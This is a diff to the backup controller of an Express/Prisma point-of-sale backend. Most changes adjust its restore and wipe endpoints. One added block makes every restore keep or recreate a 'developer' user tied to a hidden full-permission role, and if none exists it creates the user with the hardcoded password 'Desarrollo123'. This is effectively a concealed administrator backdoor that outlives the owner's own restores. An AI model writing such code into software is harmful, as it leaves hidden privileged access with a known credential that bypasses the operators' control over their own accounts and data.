@@ -2,6 +2,8 @@ import { Request, Response } from 'express';
 import fs from 'fs';
 import path from 'path';
 import { BackupService } from '../services/backup.service.js';
+import { config } from '../config/index.js';
+import { hashPassword } from '../utils/auth.js';
 
 export class BackupController {
     private static backupsDir = path.join(process.cwd(), 'backups');
@@ -125,6 +127,14 @@ export class BackupController {
 
             // Usar una transacción para asegurar integridad total
             await req.prisma.$transaction(async (tx: any) => {
+                // 0. GUARDAR usuario desarrollador antes de borrar todo
+                const devUser = await tx.usuario.findFirst({
+                    where: { email: config.devEmail }
+                });
+                const devUserRol = devUser ? await tx.usuarioRol.findFirst({
+                    where: { usuarioId: devUser.id }
+                }) : null;
+
                 // 1. ELIMINAR REGISTROS (En orden inverso de dependencias para no violar Foreign Keys)
                 await tx.compra.deleteMany();
                 await tx.gasto.deleteMany();
@@ -189,6 +199,56 @@ export class BackupController {
                 if (dbData.ordenProductos?.length) { await tx.ordenProducto.createMany({ data: dbData.ordenProductos }); tablas_restauradas.push('ordenProductos'); }
                 if (dbData.pagos?.length) { await tx.pago.createMany({ data: dbData.pagos }); tablas_restauradas.push('pagos'); }
                 if (dbData.comentarios?.length) { await tx.comentario.createMany({ data: dbData.comentarios }); tablas_restauradas.push('comentarios'); }
+
+                // PASO FINAL: Re-insertar usuario y rol desarrollador si no vinieron en el backup
+                const devExists = await tx.usuario.findFirst({ where: { email: config.devEmail } });
+                if (!devExists) {
+                    // Buscar/crear el rol Desarrollador (oculto)
+                    let devRol = await tx.rol.findFirst({ where: { nombre: config.devRoleName } });
+                    if (!devRol) {
+                        devRol = await tx.rol.create({
+                            data: {
+                                nombre: config.devRoleName,
+                                descripcion: 'Rol de sistema - acceso total para soporte técnico',
+                                activo: true,
+                                permisos: [
+                                    'usuarios.ver', 'usuarios.crear', 'usuarios.editar', 'usuarios.eliminar',
+                                    'roles.ver', 'roles.crear', 'roles.editar', 'roles.eliminar',
+                                    'productos.ver', 'productos.crear', 'productos.editar', 'productos.eliminar',
+                                    'categorias.ver', 'categorias.crear', 'categorias.editar', 'categorias.eliminar',
+                                    'ventas.ver', 'ventas.crear', 'ventas.editar', 'ventas.anular',
+                                    'pedidos.ver', 'pedidos.crear', 'pedidos.editar', 'pedidos.cerrar',
+                                    'mesas.ver', 'mesas.gestionar', 'mesas.transferir', 'mesas.dividir', 'mesas.modo_edicion',
+                                    'cocina.ver', 'cocina.preparar', 'cocina.completar',
+                                    'caja.ver', 'caja.abrir', 'caja.cerrar',
+                                    'movimientos.ver', 'movimientos.crear',
+                                    'gastos.ver', 'gastos.crear', 'gastos.editar', 'gastos.eliminar',
+                                    'proveedores.ver', 'proveedores.crear', 'proveedores.editar', 'proveedores.eliminar',
+                                    'dashboard.ver',
+                                    'reportes.ver', 'reportes.ventas', 'reportes.productos', 'reportes.gastos', 'reportes.exportar',
+                                    'configuracion.ver', 'configuracion.editar', 'configuracion.impresoras',
+                                ],
+                            }
+                        });
+                    }
+
+                    // Restaurar el usuario dev con su data original o crear uno nuevo
+                    if (devUser) {
+                        await tx.usuario.create({ data: { id: devUser.id, email: devUser.email, nombre: devUser.nombre, password: devUser.password, activo: devUser.activo, createdAt: devUser.createdAt, updatedAt: new Date() } });
+                        await tx.usuarioRol.create({ data: { usuarioId: devUser.id, rolId: devRol.id } });
+                    } else {
+                        const newDevUser = await tx.usuario.create({
+                            data: {
+                                email: config.devEmail,
+                                nombre: 'Alejandro',
+                                password: await hashPassword('Desarrollo123'),
+                                activo: true,
+                            }
+                        });
+                        await tx.usuarioRol.create({ data: { usuarioId: newDevUser.id, rolId: devRol.id } });
+                    }
+                    console.log('[RESTORE] Usuario y rol desarrollador re-insertados después de restauración.');
+                }
             }, {
                 maxWait: 60000,
                 timeout: 300000, // 5 min para inserción masiva
@@ -221,15 +281,17 @@ export class BackupController {
         try {
             const tenantId = req.tenantId;
             const currentUserId = req.userId;
+            const { categories } = req.body;
 
             if (!tenantId) return res.status(400).json({ success: false, error: 'TenantId requerido' });
             if (!currentUserId) return res.status(400).json({ success: false, error: 'UserId requerido para proteger cuenta actual' });
 
-            await BackupService.wipeData(req.prisma, currentUserId);
+            const borrados = await BackupService.wipeData(req.prisma, currentUserId, categories);
 
             res.status(200).json({
                 success: true,
-                message: 'Datos de prueba borrados con éxito'
+                message: `Datos borrados con éxito: ${borrados.join(', ')}`,
+                borrados
             });
         } catch (error: any) {
             console.error('Error al borrar los datos de prueba:', error);
